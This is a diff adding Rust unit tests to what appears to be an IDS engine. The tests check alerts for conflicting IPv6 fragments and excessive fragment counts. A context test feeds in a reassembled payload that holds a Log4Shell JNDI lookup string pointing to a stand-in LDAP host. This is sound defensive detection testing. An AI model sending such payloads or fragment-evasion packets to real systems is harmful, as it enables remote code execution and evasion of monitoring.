@@ -64,6 +64,17 @@ fn distinguishes_identical_retransmission_from_conflicting_overlap() {
 }
 
 #[test]
+fn security_reports_conflicting_ipv6_fragments() {
+    let mut security = SecurityEngine::default();
+    security.update(&fragment_packet(1, 11, 0, true, b"abcdefghijklmnop"));
+    security.update(&fragment_packet(2, 11, 8, true, b"XXXXXXXX"));
+    assert!(security
+        .ids_alerts
+        .iter()
+        .any(|alert| alert.signature == "Conflicting IPv6 fragments"));
+}
+
+#[test]
 fn reassembled_ipv6_payload_runs_through_security_signatures() {
     let payload = b"\x13\x88\x01\xbbabcdefghijkl${jndi:ldap://example.test/x}";
     let split = 24;
@@ -73,4 +84,17 @@ fn reassembled_ipv6_payload_runs_through_security_signatures() {
 
     assert_eq!(security.ipv6_reassembled, 1);
     assert!(security.ids_alerts.iter().any(|alert| alert.signature == "Log4Shell (CVE-2021-44228)"));
+}
+
+#[test]
+fn rejects_excessive_ipv6_fragment_count() {
+    let mut security = SecurityEngine::default();
+    for index in 0..=128_u64 {
+        let payload = [(index & 0xff) as u8; 8];
+        security.update(&fragment_packet(index + 1, 10, 0, true, &payload));
+    }
+    assert!(security
+        .ids_alerts
+        .iter()
+        .any(|alert| alert.signature == "IPv6 fragment reassembly rejected"));
 }
